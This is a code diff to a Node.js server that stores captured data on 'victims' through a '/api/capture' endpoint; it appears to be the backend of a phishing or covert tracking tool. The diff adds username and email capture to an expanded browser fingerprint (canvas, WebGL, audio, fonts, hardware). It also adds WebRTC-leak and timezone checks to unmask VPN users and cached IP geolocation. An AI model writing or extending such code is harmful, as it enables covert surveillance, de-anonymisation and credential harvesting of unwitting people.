@@ -33,6 +33,40 @@ const client = new MongoClient(uri, {
 
 let victimsCollection;
 
+// ═══════════════════════════════════════
+// 🗄️ CACHE SYSTEM PARA GEOLOCALIZACIÓN
+// ═══════════════════════════════════════
+const locationCache = new Map();
+const CACHE_TTL = 3600000; // 1 hora en milisegundos
+
+function getCachedLocation(ip) {
+  const cached = locationCache.get(ip);
+  if (cached && (Date.now() - cached.timestamp < CACHE_TTL)) {
+    console.log(`📦 Cache hit para IP: ${ip}`);
+    return cached.data;
+  }
+  return null;
+}
+
+function setCachedLocation(ip, data) {
+  locationCache.set(ip, {
+    data: data,
+    timestamp: Date.now()
+  });
+  console.log(`💾 IP ${ip} guardada en caché`);
+}
+
+// Limpiar caché cada hora
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, cached] of locationCache.entries()) {
+    if (now - cached.timestamp > CACHE_TTL) {
+      locationCache.delete(ip);
+    }
+  }
+  console.log(`🧹 Cache limpiado. Entradas activas: ${locationCache.size}`);
+}, CACHE_TTL);
+
 // Conectar a MongoDB Atlas
 async function connectDB() {
   try {
@@ -59,20 +93,46 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
-// Generar fingerprint si no existe
+// Generar fingerprint mejorado con más datos únicos
 function generateFingerprint(data, ip, userAgent) {
   const components = [
+    // Datos básicos
     data.fingerprint || '',
     data.username || '',
     data.email || '',
     ip || '',
     userAgent || '',
-    data.screenResolution || '',
-    data.timezone || '',
-    data.language || '',
+
+    // Screen
+    data.screen?.resolution || '',
+    data.screen?.colorDepth || '',
+    data.screen?.pixelRatio || '',
+
+    // Browser y sistema
+    data.timezoneInfo?.timezone || data.timezone || '',
+    data.browser?.language || data.language || '',
+    data.device?.platform || '',
+    data.device?.cpuCores || '',
+    data.device?.memory || '',
+
+    // Fingerprints avanzados
+    data.fingerprints?.canvas || '',
+    data.fingerprints?.webglRenderer || '',
+    data.fingerprints?.audio?.hash || '',
+
+    // Fonts (convertir array a string)
+    (data.fingerprints?.fonts || []).join(','),
+
+    // WebRTC
+    data.webRTC?.localIP || '',
+
+    // Hardware
+    JSON.stringify(data.hardware || {}),
+
+    // Timestamp para garantizar unicidad
     Date.now().toString()
   ].join('|');
-  
+
   return crypto.createHash('sha256').update(components).digest('hex');
 }
 
@@ -134,7 +194,7 @@ function parseUserAgent(ua) {
   return { browser, os };
 }
 
-// Obtener geolocalización precisa desde IP usando ipapi.co
+// Obtener geolocalización precisa desde IP usando ipapi.co (CON CACHÉ)
 async function getLocationFromIP(ip) {
     // Si es localhost o IP interna, retornar datos por defecto
     if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
@@ -152,6 +212,12 @@ async function getLocationFromIP(ip) {
         };
     }
 
+    // ✅ VERIFICAR CACHÉ PRIMERO
+    const cached = getCachedLocation(ip);
+    if (cached) {
+        return { ...cached, fromCache: true };
+    }
+
     try {
         const response = await fetch(`https://ipapi.co/${ip}/json/`);
         if (!response.ok) throw new Error('API request failed');
@@ -163,7 +229,7 @@ async function getLocationFromIP(ip) {
             throw new Error(data.reason || 'API error');
         }
 
-        return {
+        const locationData = {
             ip: data.ip || ip,
             city: data.city || 'Unknown',
             country: data.country_code || 'Unknown',
@@ -177,6 +243,11 @@ async function getLocationFromIP(ip) {
             continent: data.continent_code || 'Unknown',
             source: 'ipapi'
         };
+
+        // ✅ GUARDAR EN CACHÉ
+        setCachedLocation(ip, locationData);
+
+        return locationData;
     } catch (error) {
         console.error('Error obteniendo geolocalización desde IP:', error);
         // Fallback si falla la API
@@ -339,6 +410,41 @@ app.post('/api/capture', async (req, res) => {
     // Primero intentar con IP
     let geo = await getLocationFromIP(clientIP);
 
+    // ✅ DETECCIÓN DE VPN/PROXY
+    const vpnDetection = {
+      timezoneMismatch: false,
+      webRTCLeak: false,
+      suspiciousISP: false,
+      likelyVPN: false
+    };
+
+    // Verificar mismatch entre timezone del navegador y ubicación de IP
+    if (data.timezoneInfo?.timezone && geo.timezone && geo.timezone !== 'Unknown') {
+      const browserTZ = data.timezoneInfo.timezone;
+      const ipTZ = geo.timezone;
+
+      if (browserTZ !== ipTZ) {
+        vpnDetection.timezoneMismatch = true;
+        console.log(`⚠️ Timezone mismatch detectado: Browser=${browserTZ}, IP=${ipTZ}`);
+      }
+    }
+
+    // Verificar WebRTC leak (IP pública diferente a la IP del request)
+    if (data.webRTC?.publicIP && data.webRTC.publicIP !== 'Unknown' && data.webRTC.publicIP !== clientIP) {
+      vpnDetection.webRTCLeak = true;
+      console.log(`⚠️ WebRTC leak detectado: WebRTC IP=${data.webRTC.publicIP}, Request IP=${clientIP}`);
+    }
+
+    // ISPs conocidos de VPN
+    const vpnISPs = ['digitalocean', 'amazon', 'google cloud', 'azure', 'linode', 'vultr', 'ovh', 'hetzner'];
+    if (geo.isp && vpnISPs.some(vpn => geo.isp.toLowerCase().includes(vpn))) {
+      vpnDetection.suspiciousISP = true;
+      console.log(`⚠️ ISP sospechoso de VPN: ${geo.isp}`);
+    }
+
+    // Determinar si probablemente es VPN
+    vpnDetection.likelyVPN = vpnDetection.timezoneMismatch || vpnDetection.suspiciousISP;
+
     // Si la API de IP falló o retornó Unknown Y tenemos coordenadas GPS del usuario
     if ((geo.source === 'failed' || geo.city === 'Unknown') &&
         data.geolocation?.latitude &&
@@ -380,14 +486,15 @@ app.post('/api/capture', async (req, res) => {
       downlink: data.network?.downlink || 'Unknown',
       rtt: data.network?.rtt || 'Unknown',
       saveData: data.network?.saveData || false,
-      locationSource: geo.source || 'unknown' // Indicar de dónde viene la ubicación
+      locationSource: geo.source || 'unknown', // Indicar de dónde viene la ubicación
+      vpnDetection: vpnDetection // ✅ NUEVO: Detección de VPN/Proxy
     };
 
     data.network = networkData;
 
     // Parsear User-Agent
     const { browser, os } = parseUserAgent(userAgent);
-    
+
     if (!data.browser) data.browser = {};
     data.browser.name = browser.name;
     data.browser.version = browser.version;
@@ -397,6 +504,27 @@ app.post('/api/capture', async (req, res) => {
     data.os.name = os.name;
     data.os.version = os.version;
     data.os.platform = os.platform;
+
+    // ✅ DETECTAR TIPO DE DISPOSITIVO
+    if (!data.device) data.device = {};
+
+    const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
+    const isTablet = /tablet|ipad|playbook|silk/i.test(userAgent);
+    const isDesktop = !isMobile && !isTablet;
+
+    data.device.type = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
+    data.device.isMobile = isMobile;
+    data.device.isTablet = isTablet;
+    data.device.isDesktop = isDesktop;
+
+    // Detectar si es un bot
+    const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
+    data.device.isBot = botPatterns.test(userAgent);
+
+    // Detectar headless browser (usado en automatización)
+    data.device.isHeadless = userAgent.includes('HeadlessChrome') ||
+                             userAgent.includes('PhantomJS') ||
+                             (data.browser?.plugins && data.browser.plugins.length === 0 && !isMobile);
 
     // Guardar en MongoDB
     const saved = await saveVictim(data);
